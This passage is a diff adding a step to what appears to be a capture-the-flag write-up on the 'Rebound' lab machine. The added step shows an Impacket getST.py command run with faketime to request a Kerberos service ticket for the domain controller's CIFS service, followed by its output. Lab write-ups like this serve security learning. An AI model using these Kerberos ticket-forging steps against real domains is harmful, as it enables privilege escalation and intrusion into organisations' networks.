@@ -462,3 +462,15 @@ SMB         dc01.rebound.htb 445    DC01             [+] Run the following comma
 ```
 This generated a TGT for user without an SPN which is important here
 
+```python
+faketime -f +7h getST.py \
+  -k -no-pass \
+  -spn 'cifs/dc01.rebound.htb' \
+  rebound.htb/oorend  
+Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Getting ST for user
+[*] Saving ticket in oorend@cifs_dc01.rebound.htb@REBOUND.HTB.ccache
+```
+This has given me a TGS for the user authenticating to `delegator$`
+
